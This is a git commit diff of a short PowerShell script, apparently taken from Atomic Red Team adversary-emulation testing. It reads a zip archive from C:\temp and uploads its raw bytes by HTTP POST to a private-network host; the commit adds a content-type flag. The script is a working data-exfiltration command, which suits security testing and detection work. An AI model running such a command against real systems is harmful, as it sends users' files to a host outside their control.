e387fd7a636a5d239b30739beb7f0fdfccf54697
Jacob Greeley <jacob.greeley@mymail.champlain.edu>
2026-09-21 16:16:39 -0400

    Update httpfromatomicredteam.ps1
    added -ContentType to specify raw data

--- httpfromatomicredteam.ps1
+++ httpfromatomicredteam.ps1
@@ -1,2 +1,2 @@
 $bytes = [System.IO.File]::ReadAllBytes("C:\temp\output_7za.zip")
-Invoke-WebRequest -Uri "http://10.0.17.36:8080/upload" -Method POST -Body $bytes
+Invoke-WebRequest -Uri "http://10.0.17.36:8080/upload" -Method POST -Body $bytes -ContentType "application/octet-stream"
